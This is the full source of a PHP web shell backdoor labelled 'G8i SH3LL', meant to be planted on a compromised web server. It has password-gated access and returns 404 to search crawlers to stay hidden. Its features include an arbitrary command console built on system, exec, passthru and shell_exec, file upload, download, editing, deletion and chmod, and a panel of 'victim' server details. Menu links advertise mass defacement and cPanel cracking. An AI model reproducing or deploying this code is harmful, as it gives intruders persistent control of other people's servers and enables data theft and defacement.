<?php
session_start();
error_reporting(0);
set_time_limit(0);
 
$auth_pass = "13f32235cb86ba946d1793bf2a77b219"; // default: girls8i
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
 
function login_shell() {
?>
<html>
<head>
<link href='https://i.pinimg.com/564x/2d/ba/69/2dba693286d5baee4954a0e08c0b23d1.jpg' rel='SHORTCUT ICON'/>
<title>G8i SH3LL B4CKD00R</title>
<style>
body{
font-family: "Germania One", cursive;
    background-image: url("#");
    color:fa038a;
    background-attachment:fixed;
    background-repeat:no-repeat;
    background-position:center;
    background-color:#000;
    -webkit-background-size: 100% 100%;
}
#content tr:hover{
background-color:white;
text-shadow:1px 0px 0px #000;
}
#content .first{
background-color: lime;
font-weight: bold;
}
H1{
color:lime;
font-family: "Germania One", cursive;
}
#content .first:hover{
background-color: lime;
text-shadow:1px 0px 0px #000;
}
table{
border: 0px fa038a solid;
}
a{
color: fa038a;
text-decoration: none;
}
a:hover{
color: white;
text-shadow:1px 0px 0px #000;
}
.tombols{
background:black;
color:lime;
border-top:0;
border-left:0;
border-right:0;
border: 2px white solid;
padding:5px 8px;
text-decoration:none;
font-family: 'Germania One', sans-serif;
border-radius:5px;
}
textarea{
color:white;
background-color:transparent;
font-weight: bold;
padding:5px 8px;
font-family: "Germania One", cursive;
border: 2px white solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
input,select{
color: lime;
background-color:black;
font-weight: bold;
font-family: "Germania One", cursive;
border: 2px dotted lime;
}
pre {
color: lime;
}
.kedip {
-webkit-animation-name: blinker;
-webkit-animation-duration: 3s;
-webkit-animation-timing-function: linear;
-webkit-animation-iteration-count: infinite;

-moz-animation-name: blinker;
-moz-animation-duration: 2s;
-moz-animation-timing-function: linear;
-moz-animation-iteration-count: infinite;

 animation-name: blinker;
 animation-duration: 1s;
 animation-timing-function: linear;
 animation-iteration-count: infinite;

 color: lime;
}
@-moz-keyframes blinker {  
 0% { opacity: 1.0; }
 50% { opacity: 0.0; }
 100% { opacity: 1.0; }
 }

@-webkit-keyframes blinker {  
 0% { opacity: 1.0; }
 50% { opacity: 0.0; }
 100% { opacity: 1.0; }
 }

@keyframes blinker {  
 0% { opacity: 1.0; }
 50% { opacity: 0.0; }
 100% { opacity: 1.0; }
 }
</style>
</head>
<center>
<header>
    <link href='https://fonts.googleapis.com/css?family=Ubuntu' rel='stylesheet' type='text/css'>
<br><br><br>
<pre>
___________              .__.__          ________   ______   _________ __                
\_   _____/____    _____ |__|  | ___.__./  _____/  /  __  \ /   _____//  |______ _______ 
 |    __) \__  \  /     \|  |  |<   |  /   \  ___  >      < \_____  \\   __\__  \\_  __ \
 |     \   / __ \|  Y Y  \  |  |_\___  \    \_\  \/   --   \/        \|  |  / __ \|  | \/
 \___  /  (____  /__|_|  /__|____/ ____|\______  /\______  /_______  /|__| (____  /__|   
     \/        \/      \/        \/            \/        \/        \/           \/     
</pre>
<form method="post">
<input type="password" name="pass">
</form>
<font color="lime" size="1" face="Lato">&copy; Cantix Team</font>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
//password until here
?>
<?php
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<link href="https://i.pinimg.com/564x/2d/ba/69/2dba693286d5baee4954a0e08c0b23d1.jpg" rel="HORTCUT ICON">
<link href="" rel="stylesheet" type="text/css">
<title>G8i SH3LL v.1</title>
<style>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
@import url(http://fonts.googleapis.com/css?family=Germania One);
body{
font-family: "Ubuntu";
font-size: 13px;
background-color: black;
color:white;
}
#content tr:hover{
background-color: #a19ea8;
color: lime;
text-shadow:4px 4px 10px #a19ea8;
}
#content .first{
background-color: #a19ea8;
}
table{
border: 0px lime solid;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:lime;
text-shadow:0px 0px 10px lime;
}
input{
background: #000;
color: #fff;
-moz-border-radius: 5px;
border-radius:5px;}
 
select,textarea{
border: 1px lime solid;
background: #000;
color: #fff;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</head>
<body>
<link href="http://fonts.googleapis.com/css?family=Lato" rel="stylesheet" type="text/css">
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">';
echo '<tr>';
//Starting About victim
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
/*fuction hdd*/
if(!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}
$freespace = hdd(disk_free_space("/"));
/*Code hdd*/
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
/*code wget python perl*/
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}
//eksekusi
echo "Name of Shell: <font style='color:lime;font-size:15px' face='Lato'>CANTIX1337</font><br>";
echo "System: <font color=lime>".$kernel."</font><br>";
echo "Safe Mode: $sm<br>";
echo "Disable Functions: $show_ds<br>";
echo "Server IP: <font color=lime>".$ip."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "Group: <font color=lime>".$group."</font> (".$gid.") User: <font color=lime>".$user."</font> (".$uid.") <br>";
echo "HardDisk: <font color=lime>$used</font> / <font color=lime>$total</font> ( Free: <font color=lime>$freespace</font> )<br>";
echo "MySQL: $mysql | Curl: $curl | Perl: $perl | Python: $python | WGET: $wget ";
//ending about victim
//starting home bar
echo "<ul>";
echo "<center>
[ <a href='?'>Home</a> ] 
[<a href='?dir=$dir&do=cmd'>Console</a> ]
[ <a style='color: red;' href='?logout=true'>Logout</a> ]
</center>";
echo "</ul>";
echo "<br>";
echo "<ul>";
echo "<center>
[ <a href='?'>Mass Deface</a> ]
[ <a href='?'>Jumping</a> ]
[ <a href='?'>Cpanel Crack</a> ]
[ <a href='?'>Zone-H</a> ]
</center>";
echo "</ul>";
//fuction menu bar
if($_GET['do'] == 'cmd') {
    echo "<form method='post'>
    <font style='color: #00f;'>".$user."@".$ip.": ~ $ </font>
    <input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='Enter'>
    </form>";
    if($_POST['do_cmd']) {
        echo "<pre>".exe($_POST['cmd'])."</pre>";
    }
} elseif($_GET['logout'] == true) {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    echo "<script>window.location='?';</script>";
}
//ending home bar
echo '</tr>';
echo '<tr><td><font color="lime">Current Dir :</font> ';
 
//Code Menu
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
 
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td><center>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<center><font color="lime">Upload Success Babe:*</font><br /></center>';
}else{
echo '<center><font color="red">Upload Failed</font><br/></center>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</center></td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="lime">Set Permission Success</font><br/>';
}else{
echo '<font color="red">Set Permission Failed</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="lime">Ganti Nama Success Babe:*</font><br/>';
}else{
echo '<font color="red">Ganti Nama Failed</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
} elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="lime">Success Edit File</font><br/>';
}else{
echo '<font color="red">Failed Edit File</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="lime">Directory Terhapus</font><br/>';
}else{
echo '<font color="red">Directory Failed Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="lime">File Terhapus</font><br/>';
}else{
echo '<font color="red">File Failed Dihapus</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="1250" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Type</peller></center></td>
<td><center>Last Modify</peller></center></td>
<td><center>Owner/Group</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Action</peller></center></td>
</tr>';
//For Code Column Directory
foreach($scandir as $dir){
$dtype = filetype("$dir/$dirx");
$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
if(function_exists('posix_getpwuid')) {
                    $downer = @posix_getpwuid(fileowner("$dir/$dirx"));
                    $downer = $downer['name'];
                } else {
                    //$downer = $uid;
                    $downer = fileowner("$dir/$dirx");
                }
                if(function_exists('posix_getgrgid')) {
                    $dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
                    $dgrp = $dgrp['name'];
                } else {
                    $dgrp = filegroup("$dir/$dirx");
                }
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>';
echo "<td><center>$dtype</center></td>";
echo "<td><center>$dtime</center></td>";
echo "<td><center>$downer/$dgrp</center></td>";
echo "<td><center>--</center></td>
<td><center>";
if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
 
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="select">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">>">
</form></center></td>
</tr>';
}
//Code For File Column
foreach($scandir as $file){
$ftype = filetype("$path/$file");
$ftime = date("F d Y g:i:s", filemtime("$path/$file"));
if(function_exists('posix_getpwuid')) {
                $fowner = @posix_getpwuid(fileowner("$path/$file"));
                $fowner = $fowner['name'];
            } else {
                //$downer = $uid;
                $fowner = fileowner("$path/$file");
            }
            if(function_exists('posix_getgrgid')) {
                $fgrp = @posix_getgrgid(filegroup("$path/$file"));
                $fgrp = $fgrp['name'];
            } else {
                $fgrp = filegroup("$path/$file");
            }
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}
 
echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>';
echo "<td><center>$ftype</center></td>";
echo "<td><center>$ftime</center></td>";
echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
echo "<td><center>$size</center></td>
<td><center>";
if(is_writable($path.'/'.$file)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="select">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">>">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo "<center><hr width=280 color=lime>Copyright &copy; ".date("Y")." - <a href='https://www.facebook.com/Family-G8-Star-712755185826860/'><font color=lime>G8i Family</font></a></center>
</body>
</html>";
//Function Code HDD + exe
function hdd($s) {
    if($s >= 1073741824)
    return sprintf('%1.2f',$s / 1073741824 ).' GB';
    elseif($s >= 1048576)
    return sprintf('%1.2f',$s / 1048576 ) .' MB';
    elseif($s >= 1024)
    return sprintf('%1.2f',$s / 1024 ) .' KB';
    else
    return $s .' B';
}
function exe($cmd) {
    if(function_exists('system')) {        
        @ob_start();       
        @system($cmd);     
        $buff = @ob_get_contents();        
        @ob_end_clean();       
        return $buff;  
    } elseif(function_exists('exec')) {        
        @exec($cmd,$results);      
        $buff = "";        
        foreach($results as $result) {         
            $buff .= $result;      
        } return $buff;    
    } elseif(function_exists('passthru')) {        
        @ob_start();       
        @passthru($cmd);       
        $buff = @ob_get_contents();        
        @ob_end_clean();       
        return $buff;  
    } elseif(function_exists('shell_exec')) {      
        $buff = @shell_exec($cmd);     
        return $buff;  
    }
}
function perms($file){
$perms = fileperms($file);
 
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}
 
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
 
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
 
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
 
return $info;
}
?>
